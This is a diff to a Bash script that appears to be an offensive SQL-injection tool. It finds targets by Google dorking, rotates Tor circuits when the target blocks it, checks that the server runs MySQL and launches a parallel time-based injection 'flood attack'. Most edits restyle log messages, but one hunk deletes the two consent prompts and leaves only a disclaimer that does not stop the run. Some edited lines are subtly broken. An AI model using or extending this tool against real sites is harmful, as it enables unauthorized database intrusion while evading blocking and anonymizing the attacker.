@@ -9,17 +9,18 @@
 target_url="$1"
 export DEFIANCE_DIR="$(cd "$(dirname "${BASH_SOURCE}")" && pwd)"
 export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"
+ayamaa=$(date +%H:%M:%S)
 
 source "$DEFIANCE_DIR/../tamper/hungry.sh"
 # Killing all process related to this thing, since there's 2 vector. No no manual CTRL C.
-heyoii() {
+heyoii_d_eb() {
   trap - SIGINT SIGTERM EXIT
   echo -e "\n\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Interrupted. Killing all process.."
   kill 0 2>/dev/null
   exit 130
 }
 
-trap 'heyoii' SIGINT SIGTERM
+trap 'heyoii_d_eb' SIGINT SIGTERM
 
 if [ -n "$custom_proxy" ]; then
   export TOR_CIRCUITS=("$custom_proxy")
@@ -73,8 +74,9 @@ braindamage() {
 }
 # dork, goofle dorking. I mean google.
 dork() {
+  local ayamaa=$(date +%H:%M:%S)
   local dom="$1"
-  echo -e "[i] Launching Universal Google Dorking..."
+  echo -e ""[\033[34m${ayamaa}\033[0m] [i] Launching Universal Google Dorking..."
   sleep 2
 
   local gerbang=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
@@ -94,11 +96,11 @@ dork() {
       done < <(echo "$raw" | grep -oP '(?<=url\?q=)[^&]*' | grep "$dom" | sort -u | head -n 4)
 
       if [ ${#list[@]} -eq 0 ]; then
-        echo -e "\e[0;33m[-]\e[0m No links found on Google Index."
+        echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m-\033[0m]\e[0m No links found on Google Index."
         return 1
       fi
 
-      echo -e "\n\e[0;32m[+]\e[0m Top 4 Discovered Targets:"
+      echo -e "\n[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] Top 4 Discovered Targets:"
       for i in "${!list[@]}"; do
         echo -e "[\e[1;34m$((i+1))\e[0m] ${list[$i]}"
       done
@@ -113,7 +115,7 @@ dork() {
         echo -e "\e[0;32m[+]\e[0m Locked on: \e[1;34m$target_url\e[0m"
         return 0
       else
-        echo -e "[i] Proceeding with default input."
+        echo -e "[\033[34m${ayamaa}\033[0m] [i] Proceeding with default input."
         return 2
       fi
     }
@@ -209,14 +211,14 @@ local active_payload=""
           local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
           if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
-            echo -e "\e[0;33m[!]\e[0m Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
+            echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
             (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
             sleep 1
           fi
 
           if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
             if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-              echo -e "\e[0;31m[×]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
+              echo -e "[\033[34m${current_time}\033[0m] [\033[2;34m×\033[0m] Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
               echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
             fi
           fi
@@ -315,14 +317,14 @@ local current_time=$(date +%H:%M:%S)
             local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
             if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
-              echo -e "\e[0;33m[!]\e[0m Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
+              echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
               (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
               sleep 1
             fi
 
             if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
               if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-                echo -e "\e[0;31m[×]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
+                echo -e "[\033[34m${current_time}\033[0m] [\033[2;34m×\033[0m]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
                 echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
               fi
             fi
@@ -434,46 +436,29 @@ reconi() {
         if [[ "$recon" = "true" ]]; then
         reconi
 fi
-        echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 1/2:\e[0m Defiance Mode fires a multivector parallel network flood."
-        echo -e "Executing this mode against unauthorized infrastructures strictly violates cyber laws."
-        echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Do you have explicit written consent from the target owner? (YES/no): "
-        read -r legal_1
-
-        if [ "$legal_1" != "YES" ]; then
-          echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Aborted. Unauthorized scanning is strictly illegal."
-          exit 1
-        fi
-
-        echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 2/2:\e[0m This tool is NOT server friendly."
-        echo -e "This action will trigger heavy CPU calculation loads and dynamic Multi IP routing on the target."
-        echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Type \e[1;33m'I ACCEPT ALL RISKS'\e[0m to proceed with the execution sequence: "
-        read -r legal_2
-
-        if [ "$legal_2" != "I ACCEPT ALL RISKS" ]; then
-          echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Verification failed. Revert. Operation canceled."
-          exit 1
-        fi
+        echo -e "[WARNING]* ImCurvin is designed for authorized security testing and educational purposes only. Running this tool against targets without priorwritten consent is strictly illegal. The developer assumes no liability andis not responsible for any misuse, damage, or system instability caused bythis software. By executing this script, you agree to these terms."
+     
         if ! command -v xxd &> /dev/null; then
           echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'xxd' is not installed on your terminal."
           echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install xxd first before running imCurvin'."
           exit 1
         fi
         if [ -z "$custom_proxy" ]; then
-          echo -e "\n\e[0;33m[\e[0m!\e[0;37m]\e[0m Checking for TOR terminal service..."
+          echo -e "\n[\033[34m${ayamaa}\033[0m] [i]\e[0m Checking for TOR terminal service..."
 
           if pgrep -x "tor" >/dev/null 2>&1; then
 
-            echo -e "\e[0;32m[\e[0m=\e[0;32m]\e[0m Tor terminal service detected as active."
+            echo -e "[\033[34m${ayamaa}\033[0m] [i] Tor terminal service detected as active."
           else
-            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: Tor terminal service is not detected/running."
-            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
+            echo -e "[\033[34m${ayamaa}\033[0m] [->] WARNING: Tor terminal service is not detected/running."
+            echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
 
-            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Operation aborted due to environment mismatch."
+            echo -e "[\033[34m${ayamaa}\033[0m] [->] Operation aborted due to environment mismatch."
             exit 1
           fi
         fi
 
-        echo -e "[i] Tracing target redirections."
+        echo -e "[\033[34m${ayamaa}\033[0m] [i] Tracing target redirections."
 
         recon_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
 
@@ -493,26 +478,26 @@ fi
           dork_status=$?
 
                     if [ -f "$DEFIANCE_DIR/../validators/ayam.py" ]; then
-            echo -e "\n[i] Analyzing parameter via ayam.py.."
+            echo -e "[\033[34m${ayamaa}\033[0m] \n[i] Analyzing parameter.."
             eye_report=$(python "$DEFIANCE_DIR/../validators/ayam.py" "$target_url")
 
             param_type=$(echo "$eye_report" | cut -d'|' -f1)
             discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)
 
             if [ "$param_type" = "QUERY_PARAM" ]; then
-              echo -e "\e[0;32m[+]\e[0m Active Query Parameters Spotted > ($discovered_keys)"
+              echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] Active Query Parameters Spotted > ($discovered_keys)"
               export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
               export REQ_METHOD="GET"
               export TARGET_PARAM=$(echo "$discovered_keys" | cut -d',' -f1)
 
            elif [ "$param_type" = "PATH_PARAM" ] || [ "$param_type" = "NO_PARAM" ] || [[ "$target_url" != *"?"* ]]; then
-              echo -e "\n\e[0;31m[!]\e[0m Error: GET parameters not found [POST Method / Form Detected]."
-              echo -e "\e[0;33m[i]\e[0m Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
+              echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
+              echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
               echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
               exit 1
 
             else
-              echo -e "\e[0;33m[-]\e[0m ayam.py: No parameters detected. Falling back to default."
+              echo -e "[\033[34m${ayamaa}\033[0m] [i] No parameters detected. Falling back to default."
               export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
               export REQ_METHOD="GET"
             fi
@@ -520,43 +505,43 @@ fi
           cookie_flag=""
           if [ -n "$custom_cookie" ]; then
             cookie_flag="-b $custom_cookie"
-            echo "[i] Custom Cookie inputted: $custom_cookie" 
+            echo "[\033[34m${ayamaa}\033[0m] [i] Custom Cookie inputted: $custom_cookie" 
           fi
-          echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Performing database environment verification.."
+          echo -e "\n[\033[34m${ayamaa}\033[0m] [i] Performing database environment verification.."
 
           server_fingerprint=$(curl $recon_proxy -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
 
           if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
-            echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m Target rejected, Non MySQL environment fingerprint."
+            echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint."
 
             echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
 
-            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Revert. Operation aborted to prevent structural asset wastage."
+            echo -e "[\033[34m${ayamaa}\033[0m][->] Revert. Operation aborted to prevent structural asset wastage."
             exit 1
 
           else
 
-            echo -e "\e[0;32m[\e[0m+\e[0;37m]\e[0m Target environment matches MySQL compliance directives."
+            echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m]\e[0m Target environment matches MySQL compliance directives."
           fi
    if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
 
-echo -e "[i] This web envi is outdated/just a test, to ensure the payloads to be executed, the tamper has been downgraded [Space2comment, randomcase only].\n"
+echo -e "[\033[34m${ayamaa}\033[0m] [i] This web envi is outdated/just a test, to ensure the payloads to be executed, the tamper has been downgraded [Space2comment, randomcase only].\n"
 
 fi
           sleep 1
           if [ "$enable_val" = "true" ]; then
          if [ -s "$ROOT_LOG_FILE" ]; then
-              echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Your log file is not empty."
-              read -p "Do you want to overwrite it? (y/n): " tanya
+              echo -e "[\033[34m${ayamaa}\033[0m] [?] Your log file is not empty."
+              read -p "[\033[34m${ayamaa}\033[0m] Do you want to overwrite it? (y/n): " tanya
               if [ "$tanya" = "y" ]; then
                 > "$ROOT_LOG_FILE"
-                echo -e "\e[0;32m[\e[0m+\e[0;32m]\e[0m Log overwritten.\n"
+                echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m+\e[0m] Log overwritten.\n"
               else
-                echo -e "[i] Previous log entries will also be scanned."
+                echo -e "[\033[34m${ayamaa}\033[0m] [i] Previous log entries will also be scanned."
               fi
             fi
 fi
-          echo -e "\n\e[0;34m[\e[0mi\e[0;37m]\e[0m Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
+          echo -e "\n[\033[34m${ayamaa}\033[0m] [i] Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
 
           vector_sqli_agressor_left &
           pid_vector1=$!
@@ -566,16 +551,16 @@ fi
 
           wait $pid_vector1 $pid_vector2
 
-          echo -e "\n\e[0;32m[\e[0m=\e[0;32m]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
+          echo -e "\n[\033[34m${ayamaa}\033[0m] [COMPLETE]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
           sleep 1
           if [ "$enable_val" = "true" ]; then
             if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
               python "$DEFIANCE_DIR/../validators/defval.py"
             else
-              echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m defval.py not found. Skipping validate."
+              echo -e "[\033[34m${ayamaa}\033[0m] [->] defval.py not found. Skipping validate."
             fi
           else
-            echo -e "[i] Skipping validating, use the option -val to enable it."
+            echo -e "[\033[34m${ayamaa}\033[0m] [i] Skipping validating, use the option -val to enable it."
           fi
 
           echo ""
